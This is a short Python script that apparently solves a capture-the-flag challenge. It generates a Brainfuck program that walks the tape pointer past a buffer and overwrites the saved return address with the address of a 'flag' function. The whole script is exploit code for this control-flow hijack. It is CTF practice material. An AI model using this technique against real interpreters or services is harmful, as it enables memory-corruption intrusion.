addr_flag = 0x4011c6

def craft_write(c):
    b = int(c ** 0.5)
    payload = "+" * (c - b * b) + ">"
    payload += "[-]" + "+" * b
    payload += "[<" + "+" * b + ">-]"
    return payload

# jump to ret addr
payload = "+[>+]" + ">" * 0x28
# reset
payload += "[-]"
payload += craft_write((addr_flag >> 0) & 0xFF)
payload += craft_write((addr_flag >> 8) & 0xFF)
payload += craft_write((addr_flag >> 16) & 0xFF)
payload += ">[-]>[-]"

print(len(payload))

print(payload)
